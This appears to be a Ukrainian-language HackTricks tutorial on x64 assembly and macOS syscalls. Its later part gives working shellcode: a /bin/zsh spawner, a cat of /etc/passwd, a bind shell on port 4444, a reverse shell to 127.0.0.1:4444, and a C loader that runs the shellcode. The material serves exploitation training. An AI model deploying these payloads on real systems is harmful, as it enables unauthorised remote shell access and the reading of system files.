# Вступ до x64

{{#include ../../../banners/hacktricks-training.md}}

## **Вступ до x64**

x64, також відома як x86-64, — це 64-бітна процесорна архітектура, що переважно використовується в настільних і серверних обчислювальних системах. Вона походить від архітектури x86, розробленої Intel, а пізніше прийнятої AMD під назвою AMD64. Сьогодні це найпоширеніша архітектура персональних комп'ютерів і серверів.

### **Регістри**

x64 розширює архітектуру x86 і містить **16 регістрів загального призначення**, позначених як `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` та `r8` до `r15`. Кожен із них може зберігати **64-бітне** (8-байтове) значення. Ці регістри також мають 32-бітні, 16-бітні та 8-бітні підрегістри для сумісності й виконання специфічних завдань.

1. **`rax`** — традиційно використовується для **повернених значень** функцій.
2. **`rbx`** — часто використовується як **базовий регістр** для операцій із пам'яттю.
3. **`rcx`** — зазвичай використовується для **лічильників циклів**.
4. **`rdx`** — використовується в різних ролях, зокрема для розширених арифметичних операцій.
5. **`rbp`** — **базовий покажчик** кадру стека.
6. **`rsp`** — **покажчик стека**, що відстежує його вершину.
7. **`rsi`** та **`rdi`** — використовуються як індекси **джерела** та **призначення** в операціях із рядками/пам'яттю.
8. **`r8`** до **`r15`** — додаткові регістри загального призначення, запроваджені в x64.

### **Угода викликів**

Угода викликів x64 відрізняється залежно від операційної системи. Наприклад:

- **Windows**: перші **чотири параметри** передаються через регістри **`rcx`**, **`rdx`**, **`r8`** та **`r9`**. Подальші параметри поміщаються в стек. Повернене значення зберігається в **`rax`**.
- **System V (зазвичай використовується в UNIX-подібних системах)**: перші **шість цілочисельних параметрів або параметрів-покажчиків** передаються через регістри **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** та **`r9`**. Повернене значення також зберігається в **`rax`**.

Якщо функція має більше шести вхідних параметрів, **решта передається через стек**. **RSP**, покажчик стека, має бути **вирівняний на 16 байтів**, тобто адреса, на яку він вказує, повинна ділитися на 16 без остачі перед виконанням будь-якого виклику. Це означає, що зазвичай перед викликом функції в shellcode потрібно переконатися, що RSP правильно вирівняний. Однак на практиці системні виклики часто працюють, навіть якщо ця вимога не виконана.

### Угода викликів у Swift

Swift має власну **угоду викликів**, яку можна [**знайти тут**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Поширені інструкції**

Інструкції x64 мають широкий набір, зберігаючи сумісність із попередніми інструкціями x86 і додаючи нові.

- **`mov`**: **переміщує** значення з одного **регістра** або **ділянки пам'яті** в інший.
- Приклад: `mov rax, rbx` — переміщує значення з `rbx` до `rax`.
- **`push`** та **`pop`**: поміщають значення в **стек** або вилучають їх зі стека.
- Приклад: `push rax` — поміщає значення з `rax` у стек.
- Приклад: `pop rax` — вилучає верхнє значення зі стека до `rax`.
- **`add`** та **`sub`**: операції **додавання** та **віднімання**.
- Приклад: `add rax, rcx` — додає значення в `rax` і `rcx`, зберігаючи результат у `rax`.
- **`mul`** та **`div`**: операції **множення** та **ділення**. Примітка: вони мають особливі правила використання операндів.
- **`call`** та **`ret`**: використовуються для **виклику функцій** і **повернення з них**.
- **`int`**: використовується для запуску програмного **переривання**. Наприклад, `int 0x80` використовувалася для системних викликів у 32-бітному x86 Linux.
- **`cmp`**: **порівнює** два значення та встановлює прапорці CPU на основі результату.
- Приклад: `cmp rax, rdx` — порівнює `rax` із `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: інструкції **умовного переходу**, які змінюють потік виконання залежно від результатів попередньої інструкції `cmp` або тесту.
- Приклад: після інструкції `cmp rax, rdx`, `je label` — переходить до `label`, якщо `rax` дорівнює `rdx`.
- **`syscall`**: використовується для **системних викликів** у деяких системах x64, наприклад у сучасних Unix.
- **`sysenter`**: оптимізована інструкція **системного виклику** на деяких платформах.

### **Пролог функції**

1. **Зберегти старий базовий покажчик**: `push rbp` (зберігає базовий покажчик функції-викликувача)
2. **Перемістити поточний покажчик стека до базового покажчика**: `mov rbp, rsp` (налаштовує новий базовий покажчик поточної функції)
3. **Виділити місце в стеку для локальних змінних**: `sub rsp, <size>` (де `<size>` — кількість потрібних байтів)

### **Епілог функції**

1. **Перемістити поточний базовий покажчик до покажчика стека**: `mov rsp, rbp` (звільняє місце локальних змінних)
2. **Вилучити старий базовий покажчик зі стека**: `pop rbp` (відновлює базовий покажчик функції-викликувача)
3. **Повернутися**: `ret` (повертає керування функції-викликувачу)

## macOS

### syscalls

Існують різні класи syscalls, ви можете [**знайти їх тут**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Потім ви можете знайти номер кожного системного виклику [**за цим посиланням**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Отже, щоб викликати syscall `open` (**5**) із класу **Unix/BSD**, потрібно додати `0x2000000`

Таким чином, номер syscall для виклику open буде `0x2000005`

### Shellcodes

Для компіляції:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Щоб вилучити байти:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Код C для тестування shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Взято [**звідси**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) та пояснено.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Читання за допомогою cat

Мета полягає у виконанні `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, тому другий аргумент (x1) є масивом параметрів (у пам'яті це означає стек адрес).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Виклик команди за допомогою sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell із [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) на **порті 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell з [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell до **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Посилання

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
